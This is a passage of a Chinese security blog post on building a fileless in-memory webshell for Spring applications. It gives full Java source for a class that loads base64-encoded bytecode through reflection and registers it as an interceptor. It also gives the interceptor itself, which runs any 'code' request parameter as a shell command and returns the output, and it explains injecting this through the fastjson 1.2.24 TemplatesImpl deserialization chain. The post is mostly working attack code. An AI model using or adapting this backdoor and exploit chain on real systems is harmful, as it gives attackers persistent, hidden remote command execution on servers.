</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">com.exaple.spring</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.context.WebApplicationContext</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.context.request.RequestContextHolder</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.context.request.ServletRequestAttributes</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.servlet.support.RequestContextUtils</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">inject</span> <span class="kd">extends</span> <span class="n">AbstractTranslet</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">static</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">RequestContextUtils</span><span class="o">.</span><span class="na">findWebApplicationContext</span><span class="o">(((</span><span class="n">ServletRequestAttributes</span><span class="o">)</span> <span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">()).</span><span class="na">getRequest</span><span class="o">());</span>
</span></span><span class="line"><span class="cl"><span class="c1">//从requestMappingHandlerMapping中获取adaptedInterceptors属性 老版本是DefaultAnnotationHandlerMapping
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractHandlerMapping</span> <span class="n">abstractHandlerMapping</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractHandlerMapping</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">RequestMappingHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">handler</span><span class="o">.</span><span class="na">AbstractHandlerMapping</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;adaptedInterceptors&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">adaptedInterceptors</span> <span class="o">=</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;)</span> <span class="n">field</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">abstractHandlerMapping</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="s">&#34;com.example.spring.magicInterceptor&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//加载com.example.spring.magicInterceptor类的字节码
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">String</span> <span class="n">b64</span> <span class="o">=</span> <span class="s">&#34;yv66vgAAADQAhwoAIABGCAA4CwBHAEgLAEkASggASwgATAoATQBOCgAMAE8IAFAKAAwAUQcAUgcAUwgAVAgAVQoACwBWCABXCABYBwBZCgALAFoKAFsAXAoAEgBdCABeCgASAF8KABIAYAoAEgBhCgASAGIKAGMAZAoAYwBlCgBjAGIHAGYHAGcHAGgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUxjb20vZXhhbXBsZS9zcHJpbmcvbWFnaWNJbnRlcmNlcHRvcjsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABbwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAWMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2hhbmRsZXIBABJMamF2YS9sYW5nL09iamVjdDsBAARjb2RlAQANU3RhY2tNYXBUYWJsZQcAUwcAaQcAUgcAWQcAZwcAagcAawcAbAcAZgEACkV4Y2VwdGlvbnMBAApTb3VyY2VGaWxlAQAVbWFnaWNJbnRlcmNlcHRvci5qYXZhDAAhACIHAGoMAG0AbgcAawwAbwBwAQAAAQAHb3MubmFtZQcAcQwAcgBuDABzAHQBAAN3aW4MAHUAdgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACEAdwEABy9iaW4vc2gBAAItYwEAEWphdmEvdXRpbC9TY2FubmVyDAB4AHkHAHoMAHsAfAwAIQB9AQACXEEMAH4AfwwAgACBDACCAHQMAIMAIgcAaQwAhACFDACGACIBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAjY29tL2V4YW1wbGUvc3ByaW5nL21hZ2ljSW50ZXJjZXB0b3IBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABBqYXZhL2xhbmcvT2JqZWN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoACEAHwAgAAAAAAACAAEAIQAiAAEAIwAAAC8AAQABAAAABSq3AAGxAAAAAgAkAAAABgABAAAABwAlAAAADAABAAAABQAmACcAAAABACgAKQACACMAAAG6AAYACQAAAK8rEgK5AAMCADoEGQTGAKEsuQAEAQA6BRIFOgYSBrgAB7YACBIJtgAKmQAiuwALWQa9AAxZAxINU1kEEg5TWQUZBFO3AA86B6cAH7sAC1kGvQAMWQMSEFNZBBIRU1kFGQRTtwAPOge7ABJZGQe2ABO2ABS3ABUSFrYAFzoIGQi2ABiZAAsZCLYAGacABRkGOgYZCLYAGhkFGQa2ABsZBbYAHBkFtgAdpwAFOgUDrASsAAEADwCmAKkAHgADACQAAABGABEAAAAKAAoACwAPAA0AFwAOABsAEAArABEASgATAGYAFQB8ABYAkAAXAJUAGACcABkAoQAaAKYAHACpABsAqwAdAK0AHwAlAAAAZgAKAEcAAwAqACsABwAXAI8ALAAtAAUAGwCLAC4ALwAGAGYAQAAqACsABwB8ACoAMAAxAAgAAACvACYAJwAAAAAArwAyADMAAQAAAK8ANAA1AAIAAACvADYANwADAAoApQA4AC8ABAA5AAAAOQAH/gBKBwA6BwA7BwA6/AAbBwA8/AAlBwA9QQcAOv8AGgAFBwA+BwA/BwBABwBBBwA6AAEHAEIBAQBDAAAABAABAB4AAQBEAAAAAgBF&#34;</span><span class="o">;</span> <span class="c1">// magicInterceptor类class的base64编码
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">sun</span><span class="o">.</span><span class="na">misc</span><span class="o">.</span><span class="na">BASE64Decoder</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">newInstance</span><span class="o">().</span><span class="na">decodeBuffer</span><span class="o">(</span><span class="n">b64</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">ClassLoader</span> <span class="n">classLoader</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">m0</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;defineClass&#34;</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">m0</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">m0</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">classLoader</span><span class="o">,</span> <span class="n">className</span><span class="o">,</span> <span class="n">bytes</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="n">bytes</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//添加com.example.spring.magicInterceptor类到adaptedInterceptors
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">adaptedInterceptors</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">classLoader</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">className</span><span class="o">).</span><span class="na">newInstance</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">SerializationHandler</span><span class="o">[]</span> <span class="n">handlers</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">transform</span><span class="o">(</span><span class="n">DOM</span> <span class="n">document</span><span class="o">,</span> <span class="n">DTMAxisIterator</span> <span class="n">iterator</span><span class="o">,</span> <span class="n">SerializationHandler</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">TransletException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p><code>magicInterceptor</code>拦截器，重写<code>preHandle</code>方法，并将该class编码。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">com.example.spring</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.servlet.handler.HandlerInterceptorAdapter</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">magicInterceptor</span> <span class="kd">extends</span> <span class="n">HandlerInterceptorAdapter</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">preHandle</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">,</span> <span class="n">Object</span> <span class="n">handler</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">code</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;code&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="o">(</span><span class="n">code</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">PrintWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">String</span> <span class="n">o</span> <span class="o">=</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">ProcessBuilder</span> <span class="n">p</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;os.name&#34;</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;win&#34;</span><span class="o">)){</span>
</span></span><span class="line"><span class="cl">                    <span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;cmd.exe&#34;</span><span class="o">,</span> <span class="s">&#34;/c&#34;</span><span class="o">,</span> <span class="n">code</span><span class="o">});</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span><span class="k">else</span><span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">p</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;/bin/sh&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">code</span><span class="o">});</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span> <span class="n">c</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">start</span><span class="o">().</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\\\A&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">o</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">c</span><span class="o">.</span><span class="na">next</span><span class="o">():</span> <span class="n">o</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="n">c</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">writer</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">writer</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">                <span class="n">writer</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>利用fastjson 1.2.24的TemplatesImpl利用链，加载字节码。
<img src="/images/image-20211106230818.png" alt="">
将inject的class文件base64编码，post传入username参数。
<img src="/images/image-20211106230833.png" alt="">
执行命令
<img src="/images/image-20211106230849.png" alt=""></p>
<h2 id="参考"><a href="#参考" class="anchor-link">#</a><a href="#contents:参考" class="headings">参考</a></h2>
<ol>
<li>
<p><a href="https://f5.pm/go-83042.html" target="_blank" rel="noopener">干货｜Java Spring安全学习笔记</a></p>
</li>
<li>
<p><a href="https://www.anquanke.com/post/id/198886#h2-6" target="_blank" rel="noopener">基于内存 Webshell 的无文件攻击技术研究</a></p>
</li>
<li>
<p><a href="https://landgrey.me/blog/19/" target="_blank" rel="noopener">LandGrey's Blog</a></p>
</li>
</ol>

            </div>

            
    
    
        <ul class="post-copyright">
            <li class="copyright-item author"><span class="copyright-item-text">作者</span>：<a href="https://myzxcg.com/" class="p-author h-card" target="_blank" rel="noopener">myzxcg</a></li>
            
                
                
                
                
                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" target="_blank" rel="noopener">https://myzxcg.com/2021/11/Spring-内存马实现/</a></li>
            
            <li class="copyright-item license"><span class="copyright-item-text">许可</span>：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></li>
            
        </ul>
    



        </article>

        

        


        


        


        
    
    
        <div class="related-posts">
            <h2 class="related-title">相关文章：<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon related-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm144 276c0 6.6-5.4 12-12 12h-92v92c0 6.6-5.4 12-12 12h-56c-6.6 0-12-5.4-12-12v-92h-92c-6.6 0-12-5.4-12-12v-56c0-6.6 5.4-12 12-12h92v-92c0-6.6 5.4-12 12-12h56c6.6 0 12 5.4 12 12v92h92c6.6 0 12 5.4 12 12v56z"/></svg></h2>
            <ul class="related-list">
                
                    <li class="related-item">
                        <a href="/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/" class="related-link">Weblogic 内存马分析与实现</a>
                    </li>
                
                    <li class="related-item">
                        <a href="/2021/11/Shiro-%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" class="related-link">Shiro 回显与内存马实现</a>
                    </li>
                
                    <li class="related-item">
                        <a href="/2021/10/Tomcat-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E5%8F%8A%E6%A3%80%E6%B5%8B/" class="related-link">Tomcat 内存马分析及检测</a>
                    </li>
                
                    <li class="related-item">
                        <a href="/2021/10/Tomcat-%E6%9E%B6%E6%9E%84%E4%B8%8EContext%E5%88%86%E6%9E%90/" class="related-link">Tomcat 架构与Context分析</a>
                    </li>
                
                    <li class="related-item">
                        <a href="/2021/10/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87%E4%B8%8E%E5%88%A9%E7%94%A8/" class="related-link">FastJson 反序列化绕过与利用</a>
                    </li>
                
            </ul>
        </div>
    



        


        
    <footer class="minimal-footer">
        
            <div class="post-tag"><a href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag" class="post-tag-link">#java安全</a></div>
        
        
        
            
        
    </footer>



        


        
    
        
        
    
    
    
    
        <ul class="post-nav">
            
                <li class="post-nav-prev">
                    <a href="/2021/11/%E5%88%A9%E7%94%A8.NET-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%81%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="prev">&lt; 利用.NET 反序列化做权限维持</a>
                </li>
            
            
                <li class="post-nav-next">
                    <a href="/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/" rel="next">Weblogic 内存马分析与实现 &gt;</a>
                </li>
            
        </ul>
    



        
    

        
            <div class="load-comments">
                <div id="load-comments">加载评论</div>
            </div>
        

        

        

        
            <div id="utterances"></div>
        

        
    



    </div>
</main>


            
    <div id="back-to-top" class="back-to-top">
        <a href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
    </div>


            
    <footer id="footer" class="footer">
        <div class="footer-inner">
            

            
    
        <ul class="socials"><li class="socials-item">
                    <a href="https://github.com/myzxcg" target="_blank" rel="external noopener" title="GitHub"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
                </li><li class="socials-item">
                    <a href="https://twitter.com/myzxcg" target="_blank" rel="external noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg></a>
                </li><li class="socials-item">
